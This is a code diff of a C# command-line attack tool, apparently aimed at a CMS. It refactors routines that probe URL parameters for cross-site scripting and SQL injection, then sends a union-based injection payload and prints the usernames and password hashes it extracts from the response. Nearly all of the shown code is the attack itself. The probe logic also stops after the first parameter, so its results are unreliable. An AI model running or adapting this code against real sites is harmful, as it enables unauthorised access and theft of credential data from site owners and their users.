@@ -6,7 +6,7 @@ using System.Text.RegularExpressions;
 
 namespace asemoncms3
 {
-    class MainClass
+    internal class MainClass
     {
         public static void Main(string[] args)
         {
@@ -27,7 +27,7 @@ namespace asemoncms3
                 Console.Write($"{p}, ");
             }
 
-            string[] xxsiResult = XSSI(parameters);
+            string[] xxsiResult = XSSI(parameters, url);
 
             if (xxsiResult.Contains("No parameters were found"))
             {
@@ -49,7 +49,7 @@ namespace asemoncms3
                 string[] xssiVulnParameters = xxsiResult;
 
 
-            string[] sqliResult = SQLI(parameters);
+            string[] sqliResult = SQLI(parameters, url);
 
             if (sqliResult.Contains("No parameters were found"))
             {
@@ -88,111 +88,126 @@ namespace asemoncms3
             //URL += "?searchquery=" + Uri.EscapeUriString(unionPayload) + "&action=search";
             string[] UP =  new [] { unionPayload };
 
-            string sqliURL = url.Replace(parameters, parameters + Uri.EscapeUriString(unionPayload));
-            Console.WriteLine($"{sqliURL}");
-            HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(sqliURL);
-
-            string httpWebResponse = string.Empty;
-            using (StreamReader reader = new StreamReader(httpWebRequest.GetResponse().GetResponseStream()))
-                httpWebResponse = reader.ReadToEnd();
-
-            Regex payloadRegex = new Regex(fMarker + "(.*?)" + mMarker + "(.*?)" + eMarker);
-            MatchCollection matches = payloadRegex.Matches(httpWebResponse);
-
-            foreach (Match match in matches)
-                Console.WriteLine($"Username: {match.Groups[1].Value}\t Password hash: {match.Groups[2].Value}");
-
-            string[] XSSI(string[] xssParams)
+            foreach (string payload in UP )
             {
-                string noVulnParms = "No parameters were found to be vulnerable to XSS attempts";
-                foreach (string x in xssParams)
+                foreach (string parms in parameters)
                 {
-                    bool isVuln = false;
+                    string sqliURL = url.Replace(parms, parms + Uri.EscapeUriString(payload));
+                    Console.WriteLine($"{sqliURL}");
+                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(sqliURL);
 
-                    int i = xssParams.Length;
+                    string httpWebResponse = string.Empty;
+                    using (StreamReader reader = new StreamReader(httpWebRequest.GetResponse().GetResponseStream()))
+                        httpWebResponse = reader.ReadToEnd();
 
-                    string[] vulnParms = new string[i];
+                    Regex payloadRegex = new Regex(fMarker + "(.*?)" + mMarker + "(.*?)" + eMarker);
+                    MatchCollection matches = payloadRegex.Matches(httpWebResponse);
+
+                    foreach (Match match in matches)
+                        Console.WriteLine($"Username: {match.Groups[1].Value}\t Password hash: {match.Groups[2].Value}");
+
+                }
+            }
+        }
+
+        private static string IsHTTP(string url2Test)
+        {
+            string httpURL;
+            if (!url2Test.Contains("http://"))
+            {
+                httpURL = "http://" + url2Test;
+                url2Test = httpURL;
+            }
+            return url2Test;
+        }
+
+        private static string[] SQLI(string[] sqliParams, string url)
+        {
+            string NoVulnParameters = "No Vuln parameters found..or end of code reached";
+            foreach (string s in sqliParams)
+            {
+                bool isVuln = false;
+                string noVulnParams = "No parameters were found to be vulnerable to SQLI attempts";
+
+                int i = sqliParams.Length;
+                string[] vulnParms = new string[i];
+
+                string sqli = url.Replace(s, s + "'SELECT *");
+                Console.WriteLine($"Testing {sqliParams} for SQLI Vulnerability");
+
+                HttpWebRequest sqliWebRequest = (HttpWebRequest)WebRequest.Create(sqli);
+                sqliWebRequest.Method = "GET";
+
+                string sqliResp = string.Empty;
+                using (StreamReader rdr = new
+                    StreamReader(sqliWebRequest.GetResponse().GetResponseStream()))
+                {
+                    sqliResp = rdr.ReadToEnd();
+                }
+                if (sqliResp.Contains("SQL syntax"))
+                {
+                    Console.WriteLine("**\nFOUND POSSIBLE SQL INJECTION in " + s + "\n**");
+                    isVuln = true;
+                    vulnParms = sqliParams;
+                }
+                else if (!sqliResp.Contains("SQL syntax"))
+                {
+                    Console.WriteLine(noVulnParams);
+                    return new[] { noVulnParams };
+                }
+                if(isVuln)
+                    return vulnParms;
+
+            }
+            return new[] { NoVulnParameters };
+
+        }
+
+        private static string[] XSSI(string[] xssParams, string url)
+        {
+            string noVulnParms = "No parameters were found to be vulnerable to XSS attempts";
+            foreach (string x in xssParams)
+            {
+                bool isVuln = false;
+
+                int i = xssParams.Length;
+
+                string[] vulnParms = new string[i];
 
 
-                    string xssi = url.Replace(x, x + "BASS<xss>EXE");
-                    Console.WriteLine($"Testing {xssi} for XSS Vulnerability");
+                string xssi = url.Replace(x, x + "BASS<xss>EXE");
+                Console.WriteLine($"Testing {xssi} for XSS Vulnerability");
 
-                    HttpWebRequest xssWebRequest = (HttpWebRequest)WebRequest.Create(xssi);
-                    xssWebRequest.Method = "GET";
+                HttpWebRequest xssWebRequest = (HttpWebRequest)WebRequest.Create(xssi);
+                xssWebRequest.Method = "GET";
 
-                    string xssiWebResponse = string.Empty;
-                    using (StreamReader rdr = new
-                        StreamReader(xssWebRequest.GetResponse().GetResponseStream()))
-                    {
-                        xssiWebResponse = rdr.ReadToEnd();
-                    }
+                string xssiWebResponse = string.Empty;
+                using (StreamReader rdr = new
+                    StreamReader(xssWebRequest.GetResponse().GetResponseStream()))
+                {
+                    xssiWebResponse = rdr.ReadToEnd();
+                }
 
+                if (!xssiWebResponse.Contains("xss"))
+                {
+                    Console.WriteLine(noVulnParms);
+                    return new[] { noVulnParms };
+                }
+                else
+                {
+                    Console.WriteLine($"**\n Found Possible XSS point in parameter: {x} \n**");
+                    isVuln = true;
+                }
 
-                    if (xssiWebResponse.Contains("xss"))
-                    {
-                        Console.WriteLine($"**\n Found Possible XSS point in parameter: {x} \n**");
-                        isVuln = true;
-                        vulnParms = xssParams;
-                    }
-                    else if (!xssiWebResponse.Contains("xss"))
-                    {
-                        Console.WriteLine(noVulnParms);
-                        return new [] { noVulnParms };
-                    }
-                        return vulnParms;
-
-
+                if (isVuln)
+                {
+                    vulnParms = xssParams;
+                    Console.WriteLine(xssParams);
+                    return xssParams;
                 }
 
             }
-
-                string[] SQLI(string[] sqliParams)
-            {
-                foreach (string s in sqliParams)
-                {
-                    bool isVuln = false;
-                    string noVulnParams = "No parameters were found to be vulnerable to SQLI attempts";
-
-                    int i = sqliParams.Length;
-                    string[] vulnParms = new string[i];
-
-                    string sqli = url.Replace(s, s + "'SELECT *");
-                    Console.WriteLine($"Testing {sqliParams} for SQLI Vulnerability");
-
-                    HttpWebRequest sqliWebRequest = (HttpWebRequest)WebRequest.Create(sqli);
-                    sqliWebRequest.Method = "GET";
-
-                    string sqliResp = string.Empty;
-                    using (StreamReader rdr = new
-                        StreamReader(sqliWebRequest.GetResponse().GetResponseStream()))
-                    {
-                        sqliResp = rdr.ReadToEnd();
-                    }
-                        if (sqliResp.Contains("SQL syntax"))
-                        {
-                            Console.WriteLine("**\nFOUND POSSIBLE SQL INJECTION in " + s + "\n**");
-                            isVuln = true;
-                            vulnParms = sqliParams;
-                        }
-                        else if (!sqliResp.Contains("SQL syntax"))
-                        {
-                            Console.WriteLine(noVulnParams);
-                            return new[] { noVulnParams };
-                        }
-
-                        return vulnParms;
-                    }
-            }
-            private static string IsHTTP(string url2Test)
-            {
-                string httpURL;
-                if (!url2Test.Contains("http://"))
-                {
-                    httpURL = "http://" + url2Test;
-                    url2Test = httpURL;
-                }
-                return url2Test;
-            }
+            return new[] { noVulnParms };
         }
     }
 }
